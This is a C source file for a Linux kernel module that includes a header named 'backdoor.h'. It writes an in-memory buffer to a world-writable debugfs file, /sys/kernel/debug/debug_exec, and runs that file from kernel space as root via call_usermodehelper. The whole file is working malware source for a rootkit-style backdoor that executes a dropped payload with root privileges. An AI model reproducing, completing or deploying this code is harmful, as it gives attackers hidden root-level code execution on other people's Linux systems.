#include <linux/debugfs.h>
#include "backdoor.h"

unsigned char *buffer;
unsigned long buffer_length;

struct dentry *dfs = NULL;
struct debugfs_blob_wrapper *myblob = NULL;

void execute_file(void){
	static char *envp[] = {
		"SHELL=/bin/bash",
		"HOME=/root/",
		"USER=root",
		"PATH=/usr/local/sbin:/usr/local/bin:"\
			"/usr/sbin:/usr/bin:/sbin:/bin",
		"DISPLAY=:0",
		"PWD=/",
		NULL
	};

	char *argv[] = {
		"/sys/kernel/debug/debug_exec",
		NULL
	};

	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

int create_file(void){
	/* get mem for blob struct and init */
	myblob = kmalloc(sizeof *myblob, GFP_KERNEL);
	if (!myblob){
		return -ENOMEM;
	}

	/* only set data pointer and data size */
	myblob->data = (void *) buffer;
	myblob->size = (unsigned long) buffer_length;

	/* create pseudo file under /sys/kernel/debug_exec */
	dfs = debugfs_create_blob("debug_exec", 0777, NULL, myblob);
	if (!dfs){
		kfree(myblob);
		return -EINVAL;
	}
	return 0;
}

void destroy_file(void){
	if (dfs){
		debugfs_remove(dfs);
	}
}
